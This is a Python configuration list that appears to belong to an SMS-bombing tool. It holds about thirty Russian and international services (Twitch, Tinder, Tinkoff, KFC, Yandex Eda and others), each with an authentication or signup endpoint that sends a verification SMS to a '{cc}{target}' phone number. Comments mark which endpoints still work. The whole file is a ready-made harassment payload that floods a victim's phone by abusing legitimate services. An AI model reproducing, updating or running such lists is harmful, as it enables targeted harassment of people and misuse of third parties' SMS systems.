services = [
    {
        "name": "RuTaxi",
        "method": "POST",
        "url": "https://moscow.rutaxi.ru/ajax_keycode.html",
        "params": {
            "l": "{cc}{target}"
        },
        "identifier": "200"
    }, # RuTaxi +
{
        "name": "MTS TV",
        "method": "POST",
        "url": "https://api.mtstv.ru/v1/users",
        "json": {
            "msisdn": "{cc}{target}"
        },
        "identifier": "200"
    }, # MTS TV +
{
        "name": "MTS",
        "method": "POST",
        "url": 'https://api.mtstv.ru/v1/users',
        'json':{'msisdn': '{cc}{target}'},
        "identifier": "200"
    }, # MTS +
{
        "name": "Rutube",
        "method": "POST",
        "url": 'https://rutube.ru/api/accounts/sendpass/phone',
        'params': {'phone': '+{cc}{target}'},
        "identifier": "200"
    }, # Rutube +
{
        "name": "Twitch",
        "method": "POST",
        "url": "https://passport.twitch.tv/register?trusted_request=true",
        "json": {"Birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": '98HYtybh_9756', "phone_number": '{cc}{target}',"username": 'Rthhe7654_utr'},
        "identifier": "200"
    }, # Twitch +
    {
        "name": "qlean",
        "method": "POST",
        "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
        "params": {
            "phone": "{cc}{target}"
        },
        "identifier": "request_id"
    }, # Qlean -
    {
        "name": "mail.ru",
        "method": "POST",
        "url": "https://cloud.mail.ru//api/v2/notify/applink",
        "json": {
            "phone": "+{cc}{target}",
            "api": "2",
            "email": '{semail}',
            "x-email": 'xxx{semail}'
        },
        "identifier": "200"
    }, # Mail.ru +
    {
        "name": "youla.ru",
        "method": "POST",
        "url": "https://youla.ru/web-api/auth/request_code",
        "params": {
            "phone": "{cc}{target}"
        },
        "identifier": "code_length"
    }, # Youla +
    {
        "name": "ivi.ru",
        "method": "POST",
        "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
        "params": {
            "phone": "+{cc}{target}"
        },
        "identifier": "true"
    }, # IVI +
    {
        "name": "delitime.ru",
        "method": "POST",
        "url": "https://api.delitime.ru/api/v2/signup",
        "params": {
            "SignupForm[username]": "{cc}{target}",
            "SignupForm[device_type]": "3"
        },
        "identifier": "true"
    }, # Delitime +
    {
        "name": "icq.com",
        "method": "POST",
        "url": "https://www.icq.com/smsreg/requestPhoneValidation.php'",
        "params": {'msisdn': '{cc}{target}', "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"},
        "identifier": "200"
    }, # ICQ +
    {
        'name': 'grab',
        'method': "POST",
        'url': "https://p.grabtaxi.com/api/passenger/v2/profiles/register",
        'params':
            {
                'phoneNumber': '{target}',
                'countryCode': '{cc}',
                'name': 'Ilya',
                'email': '{email}',
                'deviceToken': '*'
            },
        "identifier": "200"
    }, # Grab -
{
        'name': 'BelcaCar',
        'method': "POST",
        'url': "https://belkacar.ru/get-confirmation-code",
        'params':
            {
                'phone': '+{cc}{target}',
            },
        "identifier": "200"
    }, # BelcaCar -
{
        'name': 'Sunlight',
        'method': "POST",
        'url': "https://api.sunlight.net/v3/customers/authorization/",
        'params':
            {
                'phone': '{cc}{target}',
            },
        "identifier": "200"
    }, # Sunlight +
{
        'name': 'Cloud mail.ru',
        'method': "POST",
        'url': "https://cloud.mail.ru/api/v2/notify/applink",
        'params':
            {
                'phone': '{cc}{target}',
            },
        "identifier": "200"
    }, # Cloud Mail.ru +
{
        'name': 'KFC',
        'method': "POST",
        'url': "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
        'json':
            {
                'phone': '+{cc}{target}',
            },
        "identifier": "200"
    }, # KFC -
{
        'name': 'UTAIR',
        'method': "POST",
        'url': "https://b.utair.ru/api/v1/login/",
        'params':
            {
                'phone': '{ccc}{target}',
            },
        "identifier": "200"
    }, # UTAIR -
{
        'name': 'Tinder',
        'method': "POST",
        'url': "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
        'params':
            {
                'phone_number': '{cc}{target}',
            },
        "identifier": "200"
    }, # Tinder +-
{
        'name': 'OK.ru',
        'method': "POST",
        'url': "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
        'params':
            {
                'st.r.phone': '+{cc}{target}',
            },
        "identifier": "200"
    }, # Ok.ru +
{
        'name': 'Karusel',
        'method': "POST",
        'url': "https://app.karusel.ru/api/v1/phone/",
        'params':
            {
                'phone': '{cc}{target}',
            },
        "identifier": "200"
    }, # Karusel -
{
        'name': 'Yandex Eda',
        'method': "POST",
        'url': "https://eda.yandex/api/v1/user/request_authentication_code",
        'json':
            {
                'phone_number': '+{cc}{target}',
            },
        "identifier": "200"
    }, # Yandex.Eda +
    {
        'name': 'Tinkoff',
        'method': 'POST',
        'url': "https://api.tinkoff.ru/v1/sign_up",
        'params':
        {
            'phone': '+{cc}{target}'
        },
        "identifier": "200"
    }, # Tinkoff +-
{
        'name': 'Rabota.ru',
        'method': 'POST',
        'url': "https://www.rabota.ru/remind",
        'params':
        {
            'credential': '{cc}{target}'
        },
        "identifier": "200"
    }, # Rabota.ru -
{
        'name': 'Citilink',
        'method': 'POST',
        'url': "https://www.citilink.ru/registration/confirm/phone/+{cc}{target}",
        'params':
        {},
        "identifier": "200"
    }, # Citilink +
{
        'name': 'Beltelecom',
        'method': 'POST',
        'url': "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
        'params':
        {'phone': '{cc}{target}'},
        "identifier": "ok"
    }, # Beltelecome +
{
        'name': 'Lenta',
        'method': 'POST',
        'url': "https://lenta.com/api/v1/authentication/requestValidationCode",
        'json':
        {'phone': '+{cc}{target}'},
        "identifier": "phoneNumber"
    }, # Lenta +
{
        'name': 'Deliviry',
        'method': 'POST',
        'url': "https://www.delivery-club.ru/ajax/user_otp",
        'params':
        {'phone': '{cc}{target}'},
        "identifier": "200"
    } # Delivery -
]